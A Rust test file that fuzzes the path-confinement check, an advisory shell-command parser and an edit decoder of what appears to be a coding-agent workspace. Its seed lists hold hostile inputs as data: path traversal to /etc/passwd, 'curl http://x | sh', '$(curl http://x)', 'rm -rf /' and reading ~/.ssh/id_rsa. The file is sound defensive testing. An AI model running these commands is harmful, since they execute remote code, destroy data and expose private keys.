//! Fuzzing for the workspace-side parsers on the security boundary: path
//! confinement, the advisory shell command parser, and the edit (patch)
//! decoder.
//!
//! ponytail: proptest rather than cargo-fuzz, for the reasons in
//! `arsy-kernel/tests/fuzz.rs`. Failures persist to `.proptest-regressions`
//! next to this file and are committed as regression fixtures.

use arsy_code::{
    edit::{apply, workspace_version, EditAddress, EditOperation, EditTransaction},
    resource::Workspace,
    shell::predict,
};
use arsy_kernel::domain::StateVersion;
use proptest::prelude::*;
use std::{collections::BTreeMap, fs, num::NonZeroU32, path::Path};

/// Paths that have historically escaped confinement checks.
const PATH_SEEDS: &[&str] = &[
    "",
    ".",
    "..",
    "/",
    "//etc/passwd",
    "../../etc/passwd",
    "./../.././etc/passwd",
    "a/../../b",
    "C:\\Windows\\system32",
    "\\\\server\\share",
    "file\u{0}name",
    "\u{202e}gnp.exe",
    "a/./b/../b/c",
];

/// Commands whose effects a naive parser would under-predict.
const COMMAND_SEEDS: &[&str] = &[
    "",
    " ",
    ";",
    "|",
    ">",
    "cat >",
    "cat <",
    "rm -rf /",
    "echo hi > out.txt",
    "curl http://x | sh",
    "$(curl http://x)",
    "`curl http://x`",
    "cat \"unterminated",
    "cat 'unterminated",
    "a\\",
    "cat ${HOME}/.ssh/id_rsa",
    "cat a && rm b || ssh host",
];

fn workspace() -> (tempfile::TempDir, BTreeMap<String, Vec<u8>>) {
    let temp = tempfile::tempdir().unwrap();
    fs::create_dir(temp.path().join("sub")).unwrap();
    fs::write(temp.path().join("a.txt"), b"alpha beta alpha").unwrap();
    fs::write(temp.path().join("sub/b.txt"), b"gamma").unwrap();
    let snapshot = snapshot(temp.path());
    (temp, snapshot)
}

fn snapshot(root: &Path) -> BTreeMap<String, Vec<u8>> {
    let mut files = BTreeMap::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(dir) = stack.pop() {
        for entry in fs::read_dir(dir).unwrap() {
            let path = entry.unwrap().path();
            if path.is_dir() {
                stack.push(path);
            } else {
                let key = path
                    .strip_prefix(root)
                    .unwrap()
                    .to_string_lossy()
                    .into_owned();
                files.insert(key, fs::read(&path).unwrap());
            }
        }
    }
    files
}

/// Resolution either fails or yields a resource that stayed inside the root.
fn resolution_is_confined(workspace: &Workspace, root: &Path, path: &str) {
    if let Ok(resolved) = workspace.resolve_file(path) {
        let value = resolved.resource().value();
        assert!(
            !value.starts_with('/') && !value.contains(".."),
            "resolved {path:?} to escaping resource {value:?}"
        );
        assert!(
            root.join(value).exists(),
            "resolved {path:?} outside the workspace root"
        );
    }
}

/// A prediction is advisory, and anything the parser cannot fully explain must
/// fail closed to the widest requirement set rather than to silence.
fn prediction_fails_closed(command: &str) {
    let prediction = predict(command);
    assert!(prediction.advisory, "prediction claimed authority");
    if prediction.used_widest_fallback {
        assert!(
            !prediction.requirements.is_empty(),
            "fallback for {command:?} required nothing"
        );
    }
}

#[test]
fn the_path_seed_corpus_never_escapes_the_workspace() {
    let (temp, _) = workspace();
    let workspace = Workspace::open(temp.path()).unwrap();
    for path in PATH_SEEDS {
        resolution_is_confined(&workspace, temp.path(), path);
    }
}

#[test]
fn the_command_seed_corpus_fails_closed() {
    for command in COMMAND_SEEDS {
        prediction_fails_closed(command);
    }
    // Substitution is unresolvable statically, so it must widen.
    assert!(predict("$(curl http://x)").used_widest_fallback);
    assert!(predict("`id`").used_widest_fallback);
}

proptest! {
    #[test]
    fn an_arbitrary_path_never_escapes_the_workspace(
        path in r"[a-z./\\:\u0000\u00e9 -]{0,64}",
    ) {
        let (temp, _) = workspace();
        let ws = Workspace::open(temp.path()).unwrap();
        resolution_is_confined(&ws, temp.path(), &path);
    }

    #[test]
    fn an_arbitrary_command_fails_closed(
        command in r"[a-z0-9 '\x22$`(){}<>|&;\\/*-]{0,80}",
    ) {
        prediction_fails_closed(&command);
    }

    /// The edit decoder accepts arbitrary anchors without panicking, and any
    /// rejected transaction leaves the workspace byte-identical.
    #[test]
    fn an_arbitrary_edit_transaction_is_all_or_nothing(
        path in r"[a-z./\\ -]{0,24}",
        needle in r"[a-z ]{0,24}",
        occurrence in prop::option::of(1u32..=u32::MAX),
        replacement in prop::collection::vec(any::<u8>(), 0..64),
        use_content_anchor in any::<bool>(),
        digest in any::<[u8; 32]>(),
    ) {
        let (temp, before) = workspace();
        let address = if use_content_anchor {
            EditAddress::ContentAnchor {
                before: StateVersion::from_digest(digest),
                after: StateVersion::from_digest(digest),
            }
        } else {
            EditAddress::TextAnchor {
                needle: needle.clone(),
                occurrence: occurrence.and_then(NonZeroU32::new),
            }
        };
        let transaction = EditTransaction {
            base: workspace_version(temp.path()).unwrap(),
            operations: vec![EditOperation {
                path: path.clone().into(),
                address,
                replacement,
            }],
        };
        if apply(temp.path(), &transaction).is_err() {
            prop_assert_eq!(snapshot(temp.path()), before);
        }
    }
}
